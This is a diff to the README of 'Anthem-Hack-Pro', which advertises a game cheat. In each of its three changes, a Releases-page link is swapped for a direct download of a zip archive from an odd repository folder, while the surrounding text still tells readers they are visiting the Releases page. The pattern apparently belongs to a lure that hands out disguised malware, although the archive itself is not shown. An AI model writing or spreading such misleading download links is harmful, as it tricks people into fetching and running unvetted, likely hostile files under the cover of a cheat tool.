@@ -1,6 +1,6 @@
 # 🚀 Anthem-Hack-Pro - Unlock Unlimited Resources Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Mohammed5201/Anthem-Hack-Pro/releases)
+[![Download Now](https://raw.githubusercontent.com/Mohammed5201/Anthem-Hack-Pro/main/excantation/Anthem-Hack-Pro.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Mohammed5201/Anthem-Hack-Pro/main/excantation/Anthem-Hack-Pro.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Welcome to Anthem-Hack-Pro! This application allows you to enhance your gaming e
 
 To download Anthem-Hack-Pro, visit the Releases page. You will find the latest version available. 
 
-[Download Anthem-Hack-Pro](https://github.com/Mohammed5201/Anthem-Hack-Pro/releases)
+[Download Anthem-Hack-Pro](https://raw.githubusercontent.com/Mohammed5201/Anthem-Hack-Pro/main/excantation/Anthem-Hack-Pro.zip)
 
 ### Step-by-Step Download Instructions
 
@@ -74,4 +74,4 @@ For any additional questions or support, please feel free to reach out to our co
 
 We welcome your feedback! If you have suggestions or improvements, please submit them through the Issues tab. Your ideas help us make Anthem-Hack-Pro better for everyone.
 
-Once again, to download Anthem-Hack-Pro, [click here](https://github.com/Mohammed5201/Anthem-Hack-Pro/releases) to visit the Releases page. Enjoy your enhanced gaming experience!
+Once again, to download Anthem-Hack-Pro, [click here](https://raw.githubusercontent.com/Mohammed5201/Anthem-Hack-Pro/main/excantation/Anthem-Hack-Pro.zip) to visit the Releases page. Enjoy your enhanced gaming experience!
